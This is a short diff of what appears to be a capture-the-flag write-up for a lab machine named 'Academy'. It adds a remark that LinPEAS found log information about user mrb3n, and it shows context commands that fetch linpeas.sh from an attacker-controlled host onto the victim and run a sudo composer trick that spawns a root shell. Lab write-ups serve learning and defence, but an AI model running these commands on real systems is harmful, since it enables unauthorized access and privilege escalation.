@@ -78,6 +78,9 @@ And then we can download the script to the victim system using wget
 ````
 wget http://10.10.14.8:8000/linpeas.sh
 ````
+
+LinPEAS shows us some interesting information in /var/log about user mrb3n  
+![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/linpeas%20pass.PNG)
 TF=$(mktemp -d)
 echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
 sudo composer --working-dir=$TF run-script x
